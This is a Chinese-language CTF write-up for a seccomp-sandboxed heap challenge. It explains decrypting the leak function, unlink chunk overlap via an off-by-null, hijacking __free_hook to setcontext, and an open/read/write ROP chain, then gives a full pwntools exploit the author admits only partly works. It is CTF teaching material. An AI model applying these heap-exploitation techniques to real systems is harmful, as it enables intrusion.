这道题增加了沙箱机制，通过seccomp-tools可以轻松获取沙箱的具体内容。

![](https://img-blog.csdnimg.cn/7a4279ec88e74e9cb4d47dca9c3a0456.png)
其中的重点就是禁用了execve系统调用，无法直接通过one_gadget、system等直接getshell。这种情况下最为常用的利用方式就是set_context函数，具体如何利用，往下看。

本题的逆向分析很简单，注意bss中结构体的识别：前8字节是地址，后8字节是大小。在show函数中发现了一个简单的加密函数：

![](https://img-blog.csdnimg.cn/d9ef1b3c1668495bb168ed3f51841a9c.png)
其每一轮的计算如下图所示，红色部分是因为溢出而无法计算的部分，每一轮的计算结果就相当于是所有黄色部分对应位异或的结果。
![](https://img-blog.csdnimg.cn/f14dc06b21fd48248692237b77a64de6.png)
那么这个函数应该如何解密呢？观察到每一轮的计算又可以分为3小轮，最后一轮是某个值与自身左移13位的异或。第二轮是另外一个值与自身右移17位的异或得到第三轮的初始值。第一轮是输入与输入自身左移5位的异或得到第二轮的初始值。如此设计解密算法也就不难了，相信了解一些算法的读者都能编写脚本。解密函数如下：

```python
def get_bits(value, start, end):
    return (value >> start) & ((1 << (end - start)) - 1)


def decrypt(value):
    for i in range(2):
        low13 = get_bits(value, 0, 13)
        mid13 = get_bits(value, 13, 26)
        mid13 ^= low13
        high6 = get_bits(value, 26, 32)
        high6 ^= get_bits(mid13, 0, 6)
        value = low13 + (mid13 << 13) + (high6 << 26)

        high17 = get_bits(value, 15, 32)
        low15 = get_bits(value, 0, 15)
        low15 ^= get_bits(high17, 2, 17)
        value = low15 + (high17 << 15)

        first5 = get_bits(value, 0, 5)
        second5 = get_bits(value, 5, 10)
        second5 ^= first5
        third5 = get_bits(value, 10, 15)
        third5 ^= second5
        fourth5 = get_bits(value, 15, 20)
        fourth5 ^= third5
        fifth5 = get_bits(value, 20, 25)
        fifth5 ^= fourth5
        sixth5 = get_bits(value, 25, 30)
        sixth5 ^= fifth5
        last2 = get_bits(value, 30, 32)
        last2 ^= get_bits(sixth5, 0, 2)
        value = first5 + (second5 << 5) + (third5 << 10) + (fourth5 << 15) + \
            (fifth5 << 20) + (sixth5 << 25) + (last2 << 30)

    return value
```

通过show函数，我们能够获取到堆块的地址。不过需要注意的是，show函数加密的并非堆块自身的地址，而是堆块前8字节的值。通过调试我们可以发现，在程序初始化时调用的seccomp系列函数会申请一些堆块，我们通过申请到这些堆块有可能使得堆块的前8字节是一个堆块地址，以此来获取堆区地址。

本题的libc环境是2.27版本，有机会改写钩子到setcontext函数【**插一句：在笔者的2.31版本libc中，setcontext函数的栈迁移指令从``mov rsp, [rdi+0xA0]``被改成了``mov rsp,[rdx+0xA0]``，这使得本题在2.31环境下无法利用，因为在执行到这里的时候无法控制rdx的值**】。自然而然地，我们容易想到使用unlink堆块重叠的利用方式。在chunk中写一个假chunk，在假chunk的prev_size写入这个chunk的地址，然后将fd和bk指针写到合适的位置，就能够触发unlink。和同年的easy_diary相比，利用难度还更低些。

![](https://img-blog.csdnimg.cn/bbadd28a80ff448791bfc3028b498852.png)
这里需要注意一下edit函数中的一个看似奇怪的函数。这个函数在read之后调用，会将第一个出现的'\x11'字符替换为0x0。乍一看，这个字符并不是字符串的结束符，但转念一想，不难发现这是出题人在为我们创造off by null的条件：'\x11'很有可能是某个chunk的size的最低1字节。可以通过这个特性修改chunk的大小和prev_inuse位。由于chunk的大小被修改了，因此在这个chunk的最后面还需要写上一个有效的size值，最低位为1，以绕过检查。

在成功unlink之后，就可以利用堆块重叠修改tcache chunk的fd指针到__free_hook。将其改写到setcontext内部即可实现栈迁移。然后构造好ROP链，打开文件、读文件、写数据。在笔者的机器上，通过调试将rdx改为与rdi的值相等实现栈迁移，但不知何故打开flag文件总是失败。

exp:（基于20.04，且需要调试修改rdx的值）
```python
from pwn import *

context(arch='amd64', log_level='debug')

io = process('./babypwn')
# io = process(['../../../../ld/ld-2.27.so', './babypwn'], env={"LD_PRELOAD": "./libc.so.6"})
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
# libc = ELF('./libc.so.6')

def add(size):
    io.sendlineafter(b'>>> ', b'1')
    io.sendlineafter(b'size:', str(size).encode())


def delete(index):
    io.sendlineafter(b'>>> ', b'2')
    io.sendlineafter(b'index:', str(index).encode())


def edit(index, content):
    io.sendlineafter(b'>>> ', b'3')
    io.sendlineafter(b'index:', str(index).encode())
    io.sendafter(b'content:', content)


def show(index):
    io.sendlineafter(b'>>> ', b'4')
    io.sendlineafter(b'index:\n', str(index).encode())
    lodword = int(io.recvuntil(b'\n', drop=True).decode(), 16)
    lodword = decrypt(lodword)
    hidword = int(io.recvuntil(b'\n', drop=True).decode(), 16)
    hidword = decrypt(hidword)
    return lodword + (hidword << 32)

def get_bits(value, start, end):
    return (value >> start) & ((1 << (end - start)) - 1)


def decrypt(value):
    for i in range(2):
        low13 = get_bits(value, 0, 13)
        mid13 = get_bits(value, 13, 26)
        mid13 ^= low13
        high6 = get_bits(value, 26, 32)
        high6 ^= get_bits(mid13, 0, 6)
        value = low13 + (mid13 << 13) + (high6 << 26)

        high17 = get_bits(value, 15, 32)
        low15 = get_bits(value, 0, 15)
        low15 ^= get_bits(high17, 2, 17)
        value = low15 + (high17 << 15)

        first5 = get_bits(value, 0, 5)
        second5 = get_bits(value, 5, 10)
        second5 ^= first5
        third5 = get_bits(value, 10, 15)
        third5 ^= second5
        fourth5 = get_bits(value, 15, 20)
        fourth5 ^= third5
        fifth5 = get_bits(value, 20, 25)
        fifth5 ^= fourth5
        sixth5 = get_bits(value, 25, 30)
        sixth5 ^= fifth5
        last2 = get_bits(value, 30, 32)
        last2 ^= get_bits(sixth5, 0, 2)
        value = first5 + (second5 << 5) + (third5 << 10) + (fourth5 << 15) + \
            (fifth5 << 20) + (sixth5 << 25) + (last2 << 30)
    return value

add(100)                            # chunk 0, used for leaking address
chunk0_addr = show(0)
print(hex(chunk0_addr))
add(0x100)                          # chunk #1
for i in range(7):
    add(0xF0)                       # chunk #2~8
chunk1_addr = chunk0_addr + 0x400

payload = p64(chunk1_addr + 0x10)
payload += p64(0x810 + 0x30 - 0x10)
payload += p64(chunk1_addr - 0x8)
payload += p64(chunk1_addr)
payload += p64(0)
edit(1, payload)

add(0x28)                           # chunk #9
add(0x100)                          # chunk #10
add(0x20)                           # chunk #11, goalkeeper
edit(9, cyclic(0x28))               # this can change the chunk #9's size from 0x511 to 0x500
edit(9, cyclic(0x20) + p64(0x810 + 0x30 - 0x10))        # write correct prev_size
edit(10, cyclic(0xF0) + p64(0) + p64(0x41))

for i in range(7):
    delete(8 - i)                   # delete chunk #2~8
delete(10)

for i in range(2):
    add(0xF0)                       # recover chunk #1, 2
add(0xF0 + 0x100)                   # recover chunk #3
main_arena = show(3) - 96
print(hex(main_arena))
__malloc_hook = main_arena - 0x10
base = __malloc_hook - libc.symbols['__malloc_hook']
__free_hook = base + libc.symbols['__free_hook']
setcontext = base + libc.symbols['setcontext']
openfile = base + libc.symbols['open']
readfile = base + libc.symbols['read']
writefile = base + libc.symbols['write']
poprdi_ret = base + 0x23B6A
poprsi_ret = base + 0x2601F
poprdx_ret = base + 0x142C92
addrsp0x18_ret = base + 0x349ea

add(0xF0 + 0x100)                   # chunk #5
edit(5, cyclic(0xF0) + p64(0) + p64(0x101) + p64(__free_hook))
add(0xF0)                           # chunk #6
add(0xF0)                           # chunk #7, to __free_hook
edit(7, p64(setcontext + 0x3D))     # change __free_hook to setcontext + 0x3D, ready for stack pivoting

add(0xF0 + 0x100)                   # chunk #8
chunk8_addr = chunk1_addr + 0x410

ROP = b'/flag'.ljust(0x30, b'\x00')     # 0x0
ROP += p64(chunk8_addr + 0x10)          # 0x30
ROP += p64(poprsi_ret)                  # 0x38
ROP += p64(2)                           # 0x40
ROP += p64(openfile)                    # 0x48
ROP += p64(poprdi_ret)                  # 0x50
ROP += p64(3)                           # 0x58
ROP += p64(poprsi_ret)                  # 0x60
ROP += p64(chunk8_addr + 0xF0)          # 0x68
ROP += p64(poprdx_ret)                  # 0x70
ROP += p64(0x30)                        # 0x78
ROP += p64(readfile)                    # 0x80
ROP += p64(poprdi_ret)                  # 0x88
ROP += p64(1)                           # 0x90
ROP += p64(addrsp0x18_ret)              # 0x98
ROP += p64(chunk8_addr + 0x40)          # 0xA0
ROP += p64(poprdi_ret)                  # 0xA8
ROP += p64(0xdeadbeef)                  # 0xB0
ROP += p64(poprsi_ret)                  # 0xB8
ROP += p64(chunk8_addr + 0xF0)          # 0xC0
ROP += p64(poprdx_ret)                  # 0xC8
ROP += p64(0x30)                        # 0xD0
ROP += p64(writefile)                   # 0xD8
edit(8, ROP)
gdb.attach(io)
time.sleep(5)
delete(8)

io.interactive()
```
